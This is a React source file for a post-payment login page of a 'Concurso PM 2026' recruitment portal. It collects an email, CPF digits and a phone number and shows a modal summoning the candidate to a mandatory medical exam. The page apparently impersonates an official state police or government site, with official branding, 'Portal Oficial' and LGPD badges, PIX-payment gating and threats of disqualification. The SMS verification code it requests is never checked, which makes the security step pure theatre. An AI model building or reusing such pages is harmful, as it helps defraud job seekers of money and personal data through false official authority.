import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle, Shield, AlertTriangle, Loader2, X, Mail, ArrowRight } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { useQuery } from '@tanstack/react-query';
import { useEstadoPM } from '@/hooks/useEstadoPM';
import { getBrasaoUrl } from '@/utils/estadoPM';
import orgLogo from '@assets/logo-mj_1779836627251.png';

export default function LoginPosPagamentoPage() {
  const [, setLocation] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const nomeCompleto = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
  const brasaoUrl = getBrasaoUrl(estadoPM);
  const [email, setEmail] = useState('');
  const [cpfDigits, setCpfDigits] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [isValidating, setIsValidating] = useState(false);
  const [showEMCMModal, setShowEMCMModal] = useState(false);
  const [acceptedEMCM, setAcceptedEMCM] = useState(false);
  const [emailSuggestions, setEmailSuggestions] = useState<string[]>([]);
  const [showSuggestions, setShowSuggestions] = useState(false);
  const [protocolData, setProtocolData] = useState<any>(null);
  const [storedGender, setStoredGender] = useState<string>('');
  const [otpSent, setOtpSent] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [phoneForOtp, setPhoneForOtp] = useState('');
  const [showPhoneEdit, setShowPhoneEdit] = useState(false);
  const [newPhone, setNewPhone] = useState('');
  const { trackEvent } = useClarityEvents();

  // Refs para os 4 boxes do CPF
  const cpfRef0 = useRef<HTMLInputElement>(null);
  const cpfRef1 = useRef<HTMLInputElement>(null);
  const cpfRef2 = useRef<HTMLInputElement>(null);
  const cpfRef3 = useRef<HTMLInputElement>(null);
  const cpfRefs = [cpfRef0, cpfRef1, cpfRef2, cpfRef3];

  const handleCpfBoxChange = (index: number, e: React.ChangeEvent<HTMLInputElement>) => {
    const digit = e.target.value.replace(/\D/g, '').slice(-1);
    if (!digit) return;
    const newVal = (cpfDigits.slice(0, index) + digit).slice(0, 4);
    setCpfDigits(newVal);
    setError('');
    if (index < 3) cpfRefs[index + 1].current?.focus();
  };

  const handleCpfBoxKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      e.preventDefault();
      if (cpfDigits.length > index) {
        setCpfDigits(cpfDigits.slice(0, index));
      } else if (index > 0) {
        setCpfDigits(cpfDigits.slice(0, index - 1));
        cpfRefs[index - 1].current?.focus();
      }
      setError('');
    }
  };

  const handleCpfBoxPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (digits) {
      setCpfDigits(digits);
      setError('');
      cpfRefs[Math.min(digits.length, 3)].current?.focus();
    }
  };

  // Get protocol_id from URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const protocolId = urlParams.get('protocol_id');

  // Read gender from pre-payment localStorage as fallback for UI before API loads
  useEffect(() => {
    try {
      const raw = localStorage.getItem('userData');
      if (raw) {
        const parsed = JSON.parse(raw);
        const g = parsed.gender || parsed.genero || parsed.sexo || parsed.autoFilledData?.gender || parsed.autoFilledData?.sexo || '';
        setStoredGender(g);
      }
    } catch { /* ignore */ }
  }, []);

  // Function to determine next step based on user completion status
  const determineNextStep = (userData: any): string => {
    // Check if user has completed payment
    const paymentCompleted = localStorage.getItem('paymentConfirmed') === 'true';
    const pixTransaction = localStorage.getItem('pixTransaction');
    
    if (paymentCompleted || pixTransaction) {
      // User has paid, check if medical exam is scheduled
      const medicalScheduled = localStorage.getItem('medicalExamScheduled');
      if (medicalScheduled) {
        return '/resultados-medicos';
      }
      return '/agendamento-medico';
    }
    
    // Check if user has completed oath/terms acceptance
    const applicationData = localStorage.getItem('applicationData');
    if (applicationData) {
      try {
        const parsedData = JSON.parse(applicationData);
        if (parsedData.juramentoAccepted) {
          return '/validacao';
        }
        if (parsedData.registrationComplete) {
          return '/registro';
        }
        return '/registro';
      } catch (e) {
        console.warn('Error parsing application data:', e);
      }
    }
    
    // Check if user has basic personal data
    if (userData.cpf && userData.name && userData.email) {
      // User has basic data, check if they've selected a position
      if (userData.jobPosition || userData.selectedPosition) {
        return '/registro';
      }
      return '/temporarios';
    }
    
    // Default: start from personal data collection
    return '/pessoal';
  };

  // Fetch protocol data if protocol_id is provided
  const { data: protocolResponse, isLoading: isLoadingProtocol } = useQuery({
    queryKey: [`/api/protocol/${protocolId}`],
    enabled: !!protocolId,
    retry: false,
  });

  useEffect(() => {
    window.scrollTo(0, 0);
    
    trackEvent('login_pos_pagamento_accessed', {
      page: 'login_pos_pagamento',
      timestamp: new Date().toISOString(),
      protocol_id: protocolId || 'none'
    });

    // Close suggestions when clicking outside
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      if (!target.closest('.email-autocomplete')) {
        setShowSuggestions(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => document.removeEventListener('click', handleClickOutside);
  }, [protocolId]);

  // Auto-fill form when protocol data is loaded
  useEffect(() => {
    if (protocolResponse && typeof protocolResponse === 'object' && 'success' in protocolResponse) {
      const response = protocolResponse as any;
      if (response.success && response.data) {
        const candidate = response.data.candidate;
        setProtocolData(response.data);
        
        if (candidate.email) {
          setEmail(candidate.email);
        }
        
        if (candidate.cpf) {
          // Extract last 4 digits from CPF
          const cleanCpf = candidate.cpf.replace(/\D/g, '');
          const lastFourDigits = cleanCpf.slice(-4);

          localStorage.setItem('phoneuser', response.data.candidate.phone)
          setCpfDigits(lastFourDigits);
        }
      }
    }
  }, [protocolResponse]);

  // Show modal after API request is complete (either success or failure)
  useEffect(() => {
    if (protocolId) {
      // Only show modal after loading is complete
      if (!isLoadingProtocol) {
        setShowEMCMModal(true);
      }
    } else {
      // If no protocol_id, show modal immediately
      setShowEMCMModal(true);
    }
  }, [protocolId, isLoadingProtocol]);

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const validateCpfDigits = (digits: string) => {
    return digits.length === 4 && /^\d{4}$/.test(digits);
  };

  const maskPhone = (phone: string) => {
    const d = phone.replace(/\D/g, '');
    if (d.length >= 11) return `(${d.slice(0,2)}) *****-${d.slice(-4)}`;
    if (d.length >= 10) return `(${d.slice(0,2)}) ****-${d.slice(-4)}`;
    return '*****-' + d.slice(-4);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsValidating(true);

    if (!validateEmail(email)) {
      setError('Por favor, insira um e-mail válido.');
      setIsValidating(false);
      return;
    }

    if (!validateCpfDigits(cpfDigits)) {
      setError('Por favor, insira os 4 últimos dígitos do seu CPF.');
      setIsValidating(false);
      return;
    }

    // Resolver telefone para OTP
    let phone = protocolData?.candidate?.phone || localStorage.getItem('phoneuser') || '';
    if (!phone) {
      try { phone = JSON.parse(localStorage.getItem('userData') || '{}').telefone || ''; } catch { /* ignore */ }
    }
    setPhoneForOtp(phone);

    // Dispara OTP — fire-and-forget
    if (phone) {
      fetch('/api/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, type: 'login' }),
      }).catch(() => {});
    }

    setIsValidating(false);
    setOtpSent(true);
  };

  const handleResendWithNewPhone = () => {
    const phone = newPhone.replace(/\D/g, '');
    if (phone.length < 10) return;
    const formatted = newPhone.trim();
    setPhoneForOtp(formatted);
    setOtpCode('');
    setError('');
    setShowPhoneEdit(false);
    setNewPhone('');
    fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: formatted, type: 'login' }),
    }).catch(() => {});
  };

  const handleOtpConfirm = async () => {
    if (!otpCode.trim()) {
      setError('Digite o código recebido por SMS.');
      return;
    }
    setError('');
    await handleLoginLogic();
  };

  const handleLoginLogic = async () => {
    try {
      setIsLoading(true);

      let candidateData = null;
      let needsGenderValidation = false;

      // Se temos dados do protocolo, usar esses dados
      if (protocolData) {
        candidateData = protocolData.candidate;
        
        // Verificar se email e CPF conferem
        if (candidateData.email.toLowerCase() !== email.toLowerCase()) {
          setError('O e-mail não confere com os dados do protocolo.');
          setIsLoading(false);
          setIsValidating(false);
          return;
        }

        const cleanCpf = candidateData.cpf.replace(/\D/g, '');
        const lastFourDigits = cleanCpf.slice(-4);
        
        if (lastFourDigits !== cpfDigits) {
          setError('Os últimos 4 dígitos do CPF não conferem.');
          setIsLoading(false);
          setIsValidating(false);
          return;
        }

        // Verificar se precisa buscar gênero
        if (!candidateData.gender) {
          needsGenderValidation = true;
        }
      } else {
        // Validar através dos dados salvos no localStorage
        const userData = localStorage.getItem('userData');
        const pixTransactionData = localStorage.getItem('pixTransaction');

        if (userData && pixTransactionData) {
          const parsedUserData = JSON.parse(userData);
          const userEmail = parsedUserData.autoFilledData?.email || parsedUserData.email;
          const userCpf = parsedUserData.autoFilledData?.cpf || parsedUserData.cpf;

          if (userEmail && userEmail.toLowerCase() !== email.toLowerCase()) {
            setError('O e-mail não confere com os dados da inscrição.');
            setIsLoading(false);
            setIsValidating(false);
            return;
          }

          if (userCpf) {
            const cleanCpf = userCpf.replace(/\D/g, '');
            const lastFourDigits = cleanCpf.slice(-4);
            
            if (lastFourDigits !== cpfDigits) {
              setError('Os últimos 4 dígitos do CPF não conferem.');
              setIsLoading(false);
              setIsValidating(false);
              return;
            }
          }

          candidateData = parsedUserData;
          needsGenderValidation = !candidateData.gender;
        } else {
          setError('Dados de inscrição não encontrados. Verifique se realizou o pagamento.');
          setIsLoading(false);
          setIsValidating(false);
          return;
        }
      }

      // Se precisar buscar dados de gênero, fazer requisição para /api/validate-cpf
      if (needsGenderValidation && candidateData?.cpf) {
        try {
          const response = await fetch('/api/validate-cpf', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              cpf: candidateData.cpf,
              name: candidateData.name
            })
          });

          if (response.ok) {
            const validationData = await response.json();
            if (validationData.success && validationData.data?.DADOS) {
              candidateData.gender = validationData.data.DADOS.sexo;
              candidateData.birthDate = validationData.data.DADOS.nascimento;
            }
          }
        } catch (error) {
          console.warn('Erro ao buscar dados adicionais:', error);
        }
      }

      // Track successful login
      trackEvent('login_pos_pagamento_success', {
        page: 'login_pos_pagamento',
        email: email,
        timestamp: new Date().toISOString()
      });

      // Ler userData pré-pagamento para preservar campos do funil anterior (CEP, cidade, endereço, etc.)
      let prePagamentoUserData: Record<string, any> = {};
      try {
        const raw = localStorage.getItem('userData');
        if (raw) prePagamentoUserData = JSON.parse(raw);
      } catch { /* ignore */ }

      // Salvar dados completos do usuário no localStorage
      // Base: dados pré-pagamento (mantém CEP, autoFilledData, cidade, etc.)
      // Camada 2: candidateData da API (sobrescreve name/cpf/email/gender quando presentes)
      // Camada 3: campos específicos do protocolo (protocolId, jobPosition, etc.)
      const completeUserData = {
        ...prePagamentoUserData,
        ...candidateData,
        email,
        lastCpfDigits: cpfDigits,
        loginTime: new Date().toISOString(),
        source: 'medical_exam',
        protocolId: protocolData?.protocol || null,
        // Adicionar dados da vaga/cargo
        jobPosition: protocolData?.jobPosition || null,
        examLocation: protocolData?.examLocation || null,
        examSchedule: protocolData?.examSchedule || null,
        additionalData: protocolData?.additionalData || null,
        // Adicionar dados da junta
        juntaData: protocolData?.juntaData || null
      };

      // Centralize all user data in a single localStorage key
      localStorage.setItem('userData', JSON.stringify(completeUserData));
      localStorage.setItem('userMedicalLogin', JSON.stringify(completeUserData));
      localStorage.setItem('loginValidated', 'true');

      // Restaurar inscrição a partir de inscricaoData (novo fluxo via /validacao)
      const inscricaoData = protocolData?.additionalData?.inscricaoData;
      if (inscricaoData) {
        // Reconstruir applicationData para que páginas downstream encontrem os dados
        const restoredApplicationData = {
          positionId: inscricaoData.vaga?.id || 'unknown',
          positionTitle: inscricaoData.vaga?.title || '',
          examDate: inscricaoData.dataProva || '',
          examTime: inscricaoData.horaProva || '',
          examLocationName: inscricaoData.localProva?.name || '',
          selectedJunta: inscricaoData.localProva
            ? {
                name: inscricaoData.localProva.name,
                address: inscricaoData.localProva.address,
                type: inscricaoData.localProva.type,
                distance: inscricaoData.localProva.distance,
                place_id: inscricaoData.localProva.place_id,
              }
            : null,
        };
        localStorage.setItem('applicationData', JSON.stringify(restoredApplicationData));

        // Restaurar pessoalData salvo como meta na vaga
        // Regra: mesclar com o existente (preserva CEP do funil pré-pagamento).
        // Só grava o resultado se o CEP mesclado for válido (8 dígitos); caso
        // contrário mantém o pessoalData existente intacto.
        if (inscricaoData.vaga?.meta) {
          let existingPessoalData: Record<string, any> = {};
          try {
            const rawPessoal = localStorage.getItem('pessoalData');
            if (rawPessoal) existingPessoalData = JSON.parse(rawPessoal);
          } catch { /* ignore */ }
          const mergedPessoalData = { ...existingPessoalData, ...inscricaoData.vaga.meta };
          const rawCep = mergedPessoalData.cep || mergedPessoalData.autoFilledData?.cep || '';
          const cleanCep = String(rawCep).replace(/\D/g, '');
          if (cleanCep.length === 8) {
            localStorage.setItem('pessoalData', JSON.stringify(mergedPessoalData));
          }
          // Se o CEP não for válido, mantém o pessoalData existente sem alteração
        }

        // Salvar local da prova separado para fácil acesso
        localStorage.setItem('examLocation', JSON.stringify(inscricaoData.localProva || {}));
        localStorage.setItem('selectedJobPosition', JSON.stringify(inscricaoData.vaga || {}));
      } else {
        // Fluxo antigo: usar campos individuais do protocolData
        if (protocolData?.jobPosition) {
          localStorage.setItem('selectedJobPosition', JSON.stringify(protocolData.jobPosition));
        }
        if (protocolData?.examLocation) {
          localStorage.setItem('examLocation', JSON.stringify(protocolData.examLocation));
        }
      }

      // Salvar dados da junta separadamente para fácil acesso
      if (protocolData?.juntaData) {
        localStorage.setItem('juntaData', JSON.stringify(protocolData.juntaData));
        console.log('Dados da junta salvos no localStorage:', protocolData.juntaData);
      }

      // Determine next step based on user completion status
      const nextStep = getNextStepForUser(completeUserData);
      setLocation(nextStep);

    } catch (error) {
      console.error('Error during login validation:', error);
      setError('Erro interno. Tente novamente.');
    } finally {
      setIsLoading(false);
      setIsValidating(false);
    }
  };

  const commonEmailProviders = [
    'gmail.com',
    'hotmail.com',
    'outlook.com',
    'yahoo.com.br',
    'yahoo.com',
    'uol.com.br',
    'bol.com.br',
    'terra.com.br',
    'ig.com.br',
    'globo.com',
    'r7.com',
    'zipmail.com.br',
    'live.com',
    'icloud.com'
  ];

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmail(value);
    setError('');

    // Check if user typed @ and show suggestions
    if (value.includes('@')) {
      const atIndex = value.lastIndexOf('@');
      const localPart = value.substring(0, atIndex);
      const domainPart = value.substring(atIndex + 1);
      
      if (localPart && domainPart.length >= 0) {
        let filteredSuggestions;
        
        if (domainPart === '') {
          // Show all suggestions when just @ is typed
          filteredSuggestions = commonEmailProviders.map(provider => `${localPart}@${provider}`);
        } else {
          // Filter suggestions based on what user is typing
          filteredSuggestions = commonEmailProviders
            .filter(provider => provider.toLowerCase().startsWith(domainPart.toLowerCase()))
            .map(provider => `${localPart}@${provider}`);
        }
        
        setEmailSuggestions(filteredSuggestions);
        setShowSuggestions(filteredSuggestions.length > 0);
      } else {
        setShowSuggestions(false);
      }
    } else {
      setShowSuggestions(false);
    }
  };

  const handleSuggestionClick = (suggestion: string) => {
    setEmail(suggestion);
    setShowSuggestions(false);
    setError('');
  };

  const handleCpfDigitsChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setCpfDigits(value);
      setError('');
    }
  };

  const handleEMCMModalClose = () => {
    if (acceptedEMCM) {
      setShowEMCMModal(false);
    }
  };

  const handleAcceptEMCM = () => {
    setAcceptedEMCM(true);
    setShowEMCMModal(false);
  };

  // Function to determine next step in user flow
  const getNextStepForUser = (userData: any): string => {
    // For users coming from login-pos-pagamento, they should go to medical scheduling
    // This page is specifically for users who have already paid and need to schedule exams
    
    // Check if medical exam is already scheduled
    const medicalScheduled = localStorage.getItem('medicalExamScheduled');
    if (medicalScheduled) {
      return '/resultados-medicos';
    }
    
    // Default for login-pos-pagamento flow: direct to medical scheduling
    return '/agendamento-medico';
  };

  // Derived: is the candidate female?
  // API gender takes priority; falls back to pre-payment storedGender whenever API gender is absent/empty
  const resolvedGender = protocolData?.candidate?.gender || storedGender;
  const isCandidataFeminina =
    resolvedGender === 'F' ||
    resolvedGender.toLowerCase() === 'f' ||
    resolvedGender.toLowerCase() === 'feminino';

  // Function to get formatted first name from protocol data
  const getFormattedFirstName = () => {
    if (protocolData?.candidate?.name) {
      const firstName = protocolData.candidate.name.split(' ')[0];
      return firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
    }
    return null;
  };

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader customTitle={sigla} />

      <main className="flex flex-col items-center px-4 py-10">

        {/* Logo + identificação */}
        <div className="w-full max-w-sm mb-6 text-center">
          <img
            src={orgLogo}
            alt={sigla}
            className="h-9 w-auto object-contain mx-auto mb-3"
          />
          <span className="text-xs text-gray-400 font-mono tracking-widest uppercase">Concurso {sigla} 2026</span>
        </div>

        {/* Título */}
        <div className="w-full max-w-sm mb-5">
          <h1 className="text-xl font-semibold text-gray-900 mb-1">
            {isCandidataFeminina ? "Portal da Candidata" : "Portal do Candidato"}
          </h1>
          <p className="text-sm text-gray-500 leading-relaxed">
            Acesse com os dados da sua inscrição para continuar o processo seletivo.
            {isCandidataFeminina && <> O processo conta com vagas e condições especiais para candidatas.</>}
          </p>
        </div>

        {/* Card do formulário */}
        <div className="w-full max-w-sm">
          <div className="bg-white border border-gray-100 shadow-sm rounded-lg overflow-hidden">

            {/* Banner de protocolo — interno ao card */}
            {protocolData && (
              <div className="bg-green-50 border-b border-green-100 px-4 py-3 flex items-start space-x-2">
                <CheckCircle className="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-xs font-medium text-green-800">Dados carregados do protocolo</p>
                  <p className="text-xs text-green-700 mt-0.5">E-mail e CPF preenchidos automaticamente. Confirme se estão corretos.</p>
                </div>
              </div>
            )}

            <div className="p-6">
              {!otpSent ? (
                <form onSubmit={handleSubmit} className="space-y-5">

                  {/* Cabeçalho interno do card */}
                  <div className="flex items-center gap-2 pb-4 border-b border-gray-100">
                    <span className="text-xs text-gray-400 uppercase tracking-widest">Acesso seguro</span>
                  </div>

                  {/* Email com ícone */}
                  <div className="relative email-autocomplete">
                    <Label htmlFor="email" className="text-xs font-medium text-gray-500 mb-1.5 block uppercase tracking-wide">
                      E-mail do protocolo
                    </Label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                      <Input
                        id="email"
                        type="email"
                        value={email}
                        onChange={handleEmailChange}
                        placeholder="seu@email.com"
                        className={`w-full pl-9 border rounded-lg text-sm focus:ring-2 focus:ring-green-600 focus:border-green-600 ${
                          protocolData ? 'border-green-300 bg-green-50' : 'border-gray-200'
                        }`}
                        disabled={isLoading || isValidating}
                        required
                        autoComplete="off"
                      />
                    </div>

                    {/* Email Suggestions Dropdown */}
                    {showSuggestions && emailSuggestions.length > 0 && (
                      <div className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-48 overflow-y-auto">
                        {emailSuggestions.slice(0, 8).map((suggestion, index) => (
                          <button
                            key={index}
                            type="button"
                            className="w-full px-3 py-2 text-left text-sm text-gray-700 hover:bg-gray-50 border-b border-gray-100 last:border-b-0"
                            onClick={() => handleSuggestionClick(suggestion)}
                          >
                            {suggestion}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* CPF — 4 boxes individuais */}
                  <div>
                    <Label className="text-xs font-medium text-gray-500 mb-2 block uppercase tracking-wide">
                      Últimos 4 dígitos do CPF
                    </Label>
                    <div className="flex gap-3 justify-center">
                      {[0, 1, 2, 3].map((i) => (
                        <input
                          key={i}
                          ref={cpfRefs[i]}
                          type="text"
                          inputMode="numeric"
                          maxLength={1}
                          value={cpfDigits[i] ?? ''}
                          onChange={(e) => handleCpfBoxChange(i, e)}
                          onKeyDown={(e) => handleCpfBoxKeyDown(i, e)}
                          onPaste={handleCpfBoxPaste}
                          disabled={isLoading || isValidating}
                          style={{ width: 56, height: 56 }}
                          className={`text-center text-2xl font-mono font-semibold border rounded-xl outline-none focus:ring-2 focus:ring-green-600 focus:border-green-600 transition-colors ${
                            protocolData ? 'border-green-300 bg-green-50' : 'border-gray-200 bg-white'
                          } disabled:opacity-50`}
                        />
                      ))}
                    </div>
                  </div>

                  {error && (
                    <div className="flex items-start space-x-2 p-3 bg-red-50 border border-red-100 rounded-lg">
                      <AlertTriangle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                      <p className="text-xs text-red-700">{error}</p>
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={isLoading || isValidating || !email || cpfDigits.length < 4}
                    className="w-full py-3 text-sm font-semibold text-white rounded-lg transition-colors duration-200 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                    style={{ backgroundColor: '#0063AF' }}
                    onMouseEnter={(e) => !e.currentTarget.disabled && (e.currentTarget.style.backgroundColor = '#004D8C')}
                    onMouseLeave={(e) => !e.currentTarget.disabled && (e.currentTarget.style.backgroundColor = '#0063AF')}
                  >
                    {isValidating ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Enviando código...
                      </>
                    ) : (
                      <>
                        Prosseguir
                        <ArrowRight className="w-4 h-4" />
                      </>
                    )}
                  </button>
                </form>
              ) : (
                <div className="space-y-4">
                  {/* Confirmação de envio */}
                  <div className="flex items-start space-x-2 p-3 bg-green-50 border border-green-100 rounded-lg">
                    <CheckCircle className="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-xs font-medium text-green-800">Código enviado por SMS</p>
                      <p className="text-xs text-green-700 mt-0.5">Verifique suas mensagens e insira o código abaixo.</p>
                    </div>
                  </div>

                  <div>
                    <Label htmlFor="otpCode" className="text-sm font-medium text-gray-700 mb-1.5 block">
                      Código de verificação
                    </Label>
                    <Input
                      id="otpCode"
                      type="text"
                      inputMode="numeric"
                      value={otpCode}
                      onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 4)); setError(''); }}
                      placeholder="0000"
                      maxLength={4}
                      className="w-full border border-gray-200 rounded-lg text-center text-2xl tracking-[0.5em] font-mono focus:ring-2 focus:ring-green-600 focus:border-green-600"
                      disabled={isLoading}
                      autoFocus
                    />
                    <p className="text-xs text-gray-400 mt-1">Código de 4 dígitos recebido no celular</p>
                  </div>

                  {error && (
                    <div className="flex items-start space-x-2 p-3 bg-red-50 border border-red-100 rounded-lg">
                      <AlertTriangle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                      <p className="text-xs text-red-700">{error}</p>
                    </div>
                  )}

                  <button
                    type="button"
                    onClick={handleOtpConfirm}
                    disabled={isLoading || !otpCode.trim()}
                    className="w-full py-3 text-sm font-semibold text-white rounded-lg transition-colors duration-200 disabled:opacity-40 disabled:cursor-not-allowed"
                    style={{ backgroundColor: '#0063AF' }}
                    onMouseEnter={(e) => !e.currentTarget.disabled && (e.currentTarget.style.backgroundColor = '#004D8C')}
                    onMouseLeave={(e) => !e.currentTarget.disabled && (e.currentTarget.style.backgroundColor = '#0063AF')}
                  >
                    {isLoading ? (
                      <span className="flex items-center justify-center">
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Verificando...
                      </span>
                    ) : 'Confirmar'}
                  </button>

                  {!showPhoneEdit ? (
                    <button
                      type="button"
                      onClick={() => { setShowPhoneEdit(true); setError(''); }}
                      className="w-full text-xs text-gray-400 hover:text-gray-600 underline transition-colors"
                      disabled={isLoading}
                    >
                      Corrigir número de telefone
                    </button>
                  ) : (
                    <div className="border border-gray-200 rounded-lg p-3 space-y-2 bg-gray-50">
                      <p className="text-xs text-gray-600 font-medium">Número correto para reenviar:</p>
                      <Input
                        type="tel"
                        inputMode="numeric"
                        value={newPhone}
                        onChange={(e) => setNewPhone(e.target.value)}
                        placeholder="(00) 00000-0000"
                        className="w-full border border-gray-200 rounded-lg text-sm focus:ring-2 focus:ring-green-600 focus:border-green-600"
                        autoFocus
                      />
                      <div className="flex gap-2">
                        <button
                          type="button"
                          onClick={handleResendWithNewPhone}
                          disabled={newPhone.replace(/\D/g, '').length < 10}
                          className="flex-1 py-2 text-xs font-medium text-white rounded-lg transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                          style={{ backgroundColor: '#0063AF' }}
                        >
                          Reenviar código
                        </button>
                        <button
                          type="button"
                          onClick={() => { setShowPhoneEdit(false); setNewPhone(''); }}
                          className="px-3 py-2 text-xs text-gray-600 border border-gray-200 rounded-lg hover:bg-gray-50"
                        >
                          Cancelar
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* Rodapé de segurança */}
          <div className="flex items-center justify-center gap-4 mt-5 text-xs text-gray-400">
            <span className="flex items-center gap-1">
              <Shield className="w-3 h-3" />
              Portal Oficial {sigla}
            </span>
            <span className="text-gray-300">·</span>
            <span>Protegido por LGPD</span>
          </div>
        </div>
      </main>

      <ExercitoFooter />
      
      {/* Avaliação de Saúde Ocupacional — Modal */}
      {showEMCMModal && (
        <>
          <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm z-40" />

          <div className="fixed inset-0 flex items-center justify-center z-50 p-4">
            <div className="bg-white w-full max-w-md max-h-[92vh] overflow-y-auto border border-gray-200 shadow-xl" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>

              {/* Barra azul superior — marca governamental */}
              <div className="h-1 w-full" style={{ backgroundColor: '#0063AF' }} />

              {/* Header: brasão + identificação */}
              <div className="flex items-center justify-between px-6 py-4 border-b border-gray-100">
                <img
                  src={brasaoUrl}
                  alt={`Brasão ${sigla}`}
                  className="h-12 w-auto object-contain"
                />
                <span className="text-xs text-gray-400 font-mono">Perícia Médica Admissional</span>
              </div>

              {/* Corpo do documento */}
              <div className="px-6 py-5 space-y-5">

                {/* Título do documento */}
                <div>
                  <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-1">Notificação Oficial</p>
                  <h2 className="text-base font-bold text-gray-900 leading-snug">
                    Convocação para Avaliação de Saúde Ocupacional
                  </h2>
                </div>

                {/* Nome do candidato — só exibe se disponível */}
                {protocolData?.candidate?.name && (
                  <>
                    <hr className="border-gray-100" />
                    <div>
                      <p className="text-xs text-gray-400 uppercase tracking-wide mb-0.5">Candidato</p>
                      <p className="text-sm font-semibold text-gray-900">
                        {protocolData.candidate.name.toUpperCase()}
                      </p>
                    </div>
                  </>
                )}

                <hr className="border-gray-100" />

                {/* Corpo do texto */}
                <div className="space-y-3 text-sm text-gray-700 leading-relaxed">
                  <p>
                    A <strong>Perícia Médica Admissional</strong> é procedimento obrigatório previsto no edital do Concurso {sigla} 2026, e verifica as condições de saúde necessárias ao exercício das funções do cargo.
                  </p>
                  <p>
                    A perícia atesta que o candidato atende aos requisitos de aptidão exigidos para posse no cargo, sendo etapa indispensável para o prosseguimento no processo seletivo da {sigla}.
                  </p>
                </div>

                <hr className="border-gray-100" />

                {/* Aviso de atenção — discreto, sem caixa vermelha */}
                <div className="flex items-start space-x-2">
                  <AlertTriangle className="w-4 h-4 text-gray-500 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-gray-600 leading-relaxed">
                    <span className="font-semibold text-gray-800">Atenção:</span> o não comparecimento implica desclassificação automática do Concurso {sigla} 2026.
                  </p>
                </div>

                <hr className="border-gray-100" />

                {/* Declaração + botão */}
                <div className="space-y-4">
                  <label className="flex items-start space-x-3 cursor-pointer">
                    <input
                      type="checkbox"
                      id="acceptEMCM"
                      checked={acceptedEMCM}
                      onChange={(e) => setAcceptedEMCM(e.target.checked)}
                      className="mt-0.5 w-4 h-4 flex-shrink-0 accent-green-700"
                    />
                    <span className="text-xs text-gray-700 leading-relaxed">
                      Declaro ter ciência de que a Perícia Médica Admissional é obrigatória e será realizada conforme as instruções da {sigla} — Concurso Público 2026.
                    </span>
                  </label>

                  <button
                    onClick={handleAcceptEMCM}
                    disabled={!acceptedEMCM}
                    className="w-full py-3 text-sm font-semibold text-white transition-colors duration-200 disabled:opacity-40 disabled:cursor-not-allowed"
                    style={{ backgroundColor: acceptedEMCM ? '#0063AF' : '#9ca3af' }}
                    onMouseEnter={(e) => { if (acceptedEMCM) e.currentTarget.style.backgroundColor = '#004D8C'; }}
                    onMouseLeave={(e) => { if (acceptedEMCM) e.currentTarget.style.backgroundColor = '#0063AF'; }}
                  >
                    Prosseguir para Agendamento
                  </button>
                </div>

              </div>

              {/* Rodapé discreto */}
              <div className="px-6 py-3 border-t border-gray-100 bg-gray-50">
                <p className="text-xs text-gray-400 text-center">
                  Documento emitido automaticamente pelo portal oficial — {sigla}
                </p>
              </div>

            </div>
          </div>
        </>
      )}
    </div>
  );
}